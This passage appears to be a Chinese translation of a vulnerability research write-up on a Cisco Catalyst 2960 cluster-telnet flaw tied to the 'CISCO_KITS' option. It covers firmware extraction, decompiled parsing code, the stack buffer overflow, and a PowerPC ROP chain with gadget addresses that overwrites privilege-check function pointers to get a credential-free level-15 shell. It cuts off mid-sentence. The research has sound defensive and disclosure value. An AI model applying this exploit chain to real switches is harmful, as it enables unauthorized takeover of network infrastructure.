
啊哈，Telnet流量实际上被封装在 Layer 2 LLC数据包中。如果看的足够仔细的话，我们将在源和目的地字段中注意到碎片化的MAC地址内的IP数据包。在这些“IP”数据包之内，存在具有telnet会话的有效TCP帧。

![](https://bbs.kanxue.com/upload/attach/201704/471870_gff4hvs3fi9muva.png)

telnet会话通常在协商telnet选项之前。其中包括：终端大小，终端类型等。请查看[RFC](https://bbs.kanxue.com/elink@eefK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1L8$3!0D9M7#2)9J5k6h3W2W2N6r3k6Q4x3X3g2G2M7X3N6Q4x3V1k6Z5N6r3#2D9i4K6u0r3M7X3k6U0z5o6f1@1)了解更多信息。

在提交欢迎`catalyst2>`消息之前，一个有趣的telnet选项被传输到服务器端：

![](https://bbs.kanxue.com/upload/attach/201704/471870_7brxhotp5opuk8p.png)

在这里，你可以看到从主交换机发送到从交换机的telnet选项`CISCO_KITS`。在执行利用期间，这和Vault 7文档中出现字符串几乎相同。是时候深入来看看交换机内部了。

### 获取固件

固件被存储在交换机中的`flash:<version>.bin`。

```
catalyst2#dir flash:

Directory of flash:/



    2  -rwx     9771282   Mar 1 1993 00:13:28 +00:00  c2960-lanbasek9-mz.122-55.SE1.bin

    3  -rwx        2487   Mar 1 1993 00:01:53 +00:00  config.text
```

内置的ftp客户端允许将此固件传输到任意ftp服务器。妥了，现在要用[`binwalk`](https://bbs.kanxue.com/elink@e78K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4k6@1N6s2W2K6x3q4)9J5c8X3u0A6L8Y4N6S2L8r3D9`.)分析和提取文件的内容：

```
$ binwalk -e c2960-lanbasek9-mz.122-55.SE1.bin 



DECIMAL       HEXADECIMAL     DESCRIPTION

--------------------------------------------------------------------------------

112           0x70            bzip2 compressed data, block size = 900k
```

为了方便对所得到的二进制数进行静态分析，我们最好知道固件加载偏移。在引导过程中，该偏移将打印到串行控制台：

```
Loading "flash:c2960-lanbasek9-mz.122-55.SE1.bin"...@@@@@@@@@@@@@@@@@@@@@@

File "flash:c2960-lanbasek9-mz.122-55.SE1.bin" uncompressed and installed,

entry point: 0x3000

executing...
```

启动IDA，嘀嘀嘀，开车了！CPU架构是PowerPC 32-bit BigEndian。在`0x3000`处加载bin：

![](https://bbs.kanxue.com/upload/attach/201704/471870_jk4z97xydblor8z.png)

### 查找字符串

还记得在之前捕获的集群流量中的`CISCO_KITS`字符串吗？这将会是我的起点了。在IDA中探索了大多数函数之后，我已经可以看见固件中对该字符串的交叉引用了。

![](https://bbs.kanxue.com/upload/attach/201704/471870_rw0jilpqwzv2alx.png)

`CISCO_KITS`被`return_cisco_kits`函数引用，该函数仅仅是返回了`char*`。我们的着重点将会放在调用了`return_cisco_kits`的`0x0004ED8C`处的`call_cisco_kits`上。

![](https://bbs.kanxue.com/upload/attach/201704/471870_kt3u2f9b7padocf.png)

因为telnet代码对于客户端和服务器而言是相当对称的，我们实际上可以看到发送到服务器端的缓冲区的格式-`%c%s%c%d:%s:%d:`。这实际上符合发送缓冲区`\x03CISCO_KITS\x012::1:`的观测流量

```
if ( telnet_struct->is_client_mode ) // client mode? then send "CISCO_KITS" string

{

    if ( telnet_struct->is_client_mode == 1 )

    {

      cisco_kits_string_2 = (char *)return_cisco_kits();

      int_two = return_2();

      tty_str = get_from_tty_struct((telnet_struct *)telnet_struct_arg->tty_struct);

      *(_DWORD *)&telnet_struct_arg->tty_struct[1].field_6D1;

      format1_ret = format_1(

                               128,

                               (int)&str_buf[8],

                               "%c%s%c%d:%s:%d:",

                               3,

                               cisco_kits_string_2,

                               1,

                               int_two,

                               tty_str,

                               0);

      telnet_struct = (telnet_struct *)telnet_send_sb(

                                         (int)telnet_struct_arg,

                                         36,

                                         0,

                                         &str_buf[8],

                                         format1_ret,

                                         v8,

                                         v7,

                                         v6);

    }

}
```

注意到什么了没？有两个`%s`格式符，但是实际上在流量样本中只有存在一个`CISCO_KITS`字符串，第二个是空的并且被限制在另个`:`之间。进一步观察相似功能的控制流程，注意到一些在处理第二个字符串时有趣的行为（这部分代码是服务器的部分）：

```
for ( j = (unsigned __int8)*string_buffer; j != ':'; j = (unsigned __int8)*string_buffer )// put data before second ":" at &str_buf + 152

{

    str_buf[v19++ + 152] = j;

    ++string_buffer;

}
```

我们在第二个`%s`字符串中发送的数据实际上被复制直到`:`，并且没有检查目标缓冲区驻留在堆栈上的边界。这看起来像什么？没错，缓冲区溢出！

![](https://bbs.kanxue.com/upload/attach/201704/471870_5utgjprfti7drr8.png)

### 执行代码

获取指令指针的控制很容易，因为它已被我发送的缓冲区(顺便说一句，我使用[`IOIDE`](https://bbs.kanxue.com/elink@6daK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6F1j5$3y4Y4M7X3!0#2M7q4)9J5c8V1W2a6c8p5W2p5c8b7`.`.)调试)覆盖。问题在于堆和栈（驻留在堆中）没有执行权限。我敢打赌，这实际上是启用数据和指令缓存的效果。以下是Felix Lindner在BlackHat 2009上的[演示文稿](https://bbs.kanxue.com/elink@019K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1L8r3q4U0K9$3S2S2N6q4)9J5k6h3y4G2L8g2)9J5c8Y4m8J5k6i4y4W2L8Y4c8S2N6r3W2G2L8Y4y4Q4x3V1k6T1K9q4)9J5k6s2g2K6j5g2)9J5k6o6l9&6i4K6u0r3e0p5W2z5c8p5&6q4f1W2)9J5c8V1u0t1g2g2y4m8x3o6W2Q4x3X3c8x3K9h3&6V1L8X3g2J5i4K6u0V1f1X3!0#2N6r3g2J5c8i4S2H3L8r3!0A6N6q4)9J5k6q4y4x3d9f1c8q4f1#2)9J5k6i4m8V1k6R3`.`.)：

![](https://bbs.kanxue.com/upload/attach/201704/471870_mgjf0cky57069b1.png)

### 使用ROP杀出一条血路

由于没有办法在堆栈上执行代码，所以我不得不将其用作数据缓冲区并重新使用固件中的现有代码。思路是将一系列函数的末尾有意义地链起来以执行任意内存写入。但是，等等，要写些什么？看看对`0x00F47A34`处函数的反编译：

```
if ( ptr_is_cluster_mode(tty_struct_var->telnet_struct_field) )

{

  telnet_struct_var = tty_struct_var->telnet_struct_field;

  ptr_get_privilege_level = (int (__fastcall *)(int))some_libc_func(0, (unsigned int *)&dword_22659D4[101483]);

  privilege_level = ptr_get_privilege_level(telnet_struct_var);// equals to 1 during rcommand 1

  telnet_struct_1 = tty_struct_var->telnet_struct_field;

  ptr_telnet_related2 = (void (__fastcall *)(int))some_libc_func(1u, (unsigned int *)&dword_22659D4[101487]);

  ptr_telnet_related2(telnet_struct_1);

  *(_DWORD *)&tty_struct_var->privilege_level_field = ((privilege_level << 28) & 0xF0000000 | *(_DWORD *)&tty_struct_var->privilege_level_field & 0xFFFFFFF) & 0xFF7FFFFF;

}

else

{

  //generic telnet session

}
```

有趣的事情发生了。首先需要强调的是`ptr_is_cluster_mode` 和`ptr_get_privilege_level` 这两个调用是直接引用的全局变量。看下`0x00F47B60`处-`is_cluster_mode`函数地址从`0x1F24A7`处加载。类似的，`get_privilege_level` 的地址从`0xF47B8C`处的`r3`处加载。此刻，`r3`是一个已经对地址`0x022659D4 + 0x28 + 0xC`处取消引用的指针。

![](https://bbs.kanxue.com/upload/attach/201704/471870_vt4q6u01mifdfyf.png)

如果`ptr_is_cluster_mode` 调用返回非0值并且`ptr_get_privilege`调用返回非-1的值那么我们将被提供一个telnet shell，而不需要提供任何凭据。变量`privilege_level`正在进一步的被检查：

![](https://bbs.kanxue.com/upload/attach/201704/471870_6vxluc6p0depofy.png)

如果我可以覆盖这些函数指针使其指向总是返回所需要的正值会发生什么呢？由于栈和堆都不能直接执行，我不得不重新使用已经存在的代码来完成这样的内存写入功能。下边的ROP部件就是我使用的：

```
0x000037b4: 

    lwz r0, 0x14(r1)

    mtlr r0

    lwz r30, 8(r1)

    lwz r31, 0xc(r1)

    addi r1, r1, 0x10 

    blr
```

将`is_cluster_mode` 函数地址载入`r30`，加载值将该指针覆盖到`r31`中。覆盖的值是始终返回1的函数的地址：

![](https://bbs.kanxue.com/upload/attach/201704/471870_mb99rp5qkt3qgl0.png)

```
0x00dffbe8: 

    stw r31, 0x34(r30)

    lwz r0, 0x14(r1)

    mtlr r0

    lmw r30, 8(r1)

    addi r1, r1, 0x10

    blr
```

执行写入：

```
0x0006788c: 

    lwz r9, 8(r1)

    lwz r3, 0x2c(r9)

    lwz r0, 0x14(r1)

    mtlr r0

    addi r1, r1, 0x10

    blr
```

```
0x006ba128: 

    lwz r31, 8(r1)

    lwz r30, 0xc(r1)

    addi r1, r1, 0x10

    lwz r0, 4(r1)

    mtlr r0

    blr
```

上边的两个部件将`get_privilege_level` 的函数指针加载到`r3`，并且将值覆盖到`r31`中。目标值是一个返回15的函数地址(其实可以2次都使用这个函数)。

![](https://bbs.kanxue.com/upload/attach/201704/471870_q5hny06ntqshw7j.png)

```
0x0148e560: 

    stw r31, 0(r3)

    lwz r0, 0x14(r1)

    mtlr r0

    lwz r31, 0xc(r1)

    addi r1, r1, 0x10

    blr
```

这个函数结尾部分执行最终写入并返回到合法的执行流程。当然了，应该构造好栈帧以便ROP链起作用。查看[漏洞利用源代码](https://bbs.kanxue.com/elink@eb8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8C8L8$3&6V1i4K6u0r3j5$3W2K6j5$3!0Q4x3X3c8J5j5$3g2Q4x3V1k6T1L8r3!0T1i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3j5K6t1&6y4U0m8Q4x3X3c8D9j5h3&6T1j5i4y4W2K9K6W2Q4x3X3c8E0i4K6u0V1x3e0u0Q4x3X3f1J5i4K6u0W2y4e0g2Q4x3X3g2K6k6e0q4Q4x3X3g2H3P5b7`.`.)，可以看看该链按照预期工作的实际堆栈布局。

### 执行exploit

在一天结束的时候，我完成了一个工具，能够patch负责无连接和权限级别的函数指针。请注意，漏洞利用代码严重依赖于交换机上使用的固件版本。对某些不同的固件使用漏洞代码最可能会使设备崩溃。

我从旧的固件SE1的静态和动态分析来获取相关信息，然后在最新的建议固件12.2（55）SE11上构建漏洞。固件版本之间的所有区别是不同的函数和指针偏移。此外，漏洞利用的方式可以轻松地将更改还原。 例：
